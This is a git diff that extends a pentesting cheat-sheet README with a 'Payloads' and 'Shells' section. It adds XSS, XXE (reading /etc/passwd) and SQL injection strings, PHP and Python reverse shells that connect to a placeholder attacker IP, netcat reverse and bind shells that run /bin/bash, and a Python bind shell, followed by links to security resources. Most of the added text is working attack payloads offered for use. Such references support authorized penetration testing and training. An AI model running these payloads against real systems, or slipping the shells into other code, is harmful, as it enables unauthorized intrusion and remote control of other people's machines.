@@ -1,3 +1,4 @@
+
 # Penooo-Cheatsheet for Pentesting
 
 A collection of **useful commands and scripts** for pentesting tools, organized by the specific tools used. This repository serves as a handy reference for commonly used tools and their commands, making your pentesting tasks faster and more efficient.
@@ -14,6 +15,18 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Netcat](#netcat)
   - [SearchSploit](#searchsploit)
   - [TCPDump](#tcpdump)
+- [Payloads](#payloads)
+  - [XSS Payloads](#xss-payloads)
+  - [XML Payloads](#xml-payloads)
+  - [SQL Payloads](#sql-payloads)
+  - [Other Payloads](#other-payloads)
+- [Shells](#shells)
+  - [Reverse Shells](#reverse-shells)
+  - [Bind Shells](#bind-shells)
+- [Useful Resources](#useful-resources)
+  - [Payloads and Exploits](#payloads-and-exploits)
+  - [Pentesting Guides](#pentesting-guides)
+  - [Security Tools](#security-tools)
 - [Contributing](#contributing)
 - [License](#license)
 
@@ -145,6 +158,108 @@ cd cheatsheet-pentesting
   ```bash
   tcpdump -i <interface> port 80
   ```
+
+---
+
+## Payloads
+
+### XSS Payloads
+- **Basic XSS Test**:
+  ```html
+  <script>alert('XSS');</script>
+  ```
+
+- **XSS in Image Tag**:
+  ```html
+  <img src=x onerror=alert('XSS')>
+  ```
+
+### XML Payloads
+- **XML External Entity (XXE) Injection**:
+  ```xml
+  <!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <root>&xxe;</root>
+  ```
+
+- **XML Injection**:
+  ```xml
+  <user><name>admin' or '1'='1</name></user>
+  ```
+
+### SQL Payloads
+- **Basic SQL Injection**:
+  ```sql
+  ' OR 1=1 --
+  ```
+
+- **Blind SQL Injection**:
+  ```sql
+  ' AND IF(1=1,SLEEP(5),0)--
+  ```
+
+### Other Payloads
+- **PHP Reverse Shell**:
+  ```php
+  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1'"); ?>
+  ```
+
+- **Python Reverse Shell**:
+  ```python
+  import socket, subprocess, os
+  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+  s.connect(("<attacker-IP>",<port>))
+  os.dup2(s.fileno(), 0)
+  os.dup2(s.fileno(), 1)
+  os.dup2(s.fileno(), 2)
+  subprocess.call(["/bin/sh","-i"])
+  ```
+
+---
+
+## Shells
+
+### Reverse Shells
+- **Netcat Reverse Shell**:
+  ```bash
+  nc -e /bin/bash <attacker-IP> <port>
+  ```
+
+- **Python Reverse Shell**:
+  ```bash
+  python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+  ```
+
+### Bind Shells
+- **Netcat Bind Shell**:
+  ```bash
+  nc -lvnp <port> -e /bin/bash
+  ```
+
+- **Python Bind Shell**:
+  ```bash
+  python3 -c 'import socket,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",<port>)); s.listen(1); conn, addr = s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); os.system("/bin/sh")'
+  ```
+
+---
+
+## Useful Resources
+
+### Payloads and Exploits
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive collection of payloads.
+- [GTFOBins](https://gtfobins.github.io/): A curated list of Unix binaries that can be exploited by pentesters.
+- [Exploit-DB](https://www.exploit-db.com/): A database of public exploits and proof-of-concepts.
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/): A list of the top 10 security risks.
+
+### Pentesting Guides
+- [HackTricks](https://book.hacktricks.xyz/): A handbook with tips and tricks for pentesting.
+- [PentesterLab](https://www.pentesterlab.com/): A platform offering a variety of web application and pentesting exercises.
+- [Hack The Box](https://www.hackthebox.eu/): A platform for pentesting challenges and exercises.
+
+### Security Tools
+- [Burp Suite](https://portswigger.net/burp): A popular web vulnerability scanner and proxy tool.
+- [Nikto](https://cirt.net/Nikto2): A web server scanner to find potential vulnerabilities.
+- [Wireshark](https://www.wireshark.org/): A network protocol analyzer used for packet inspection.
 
 ---
 
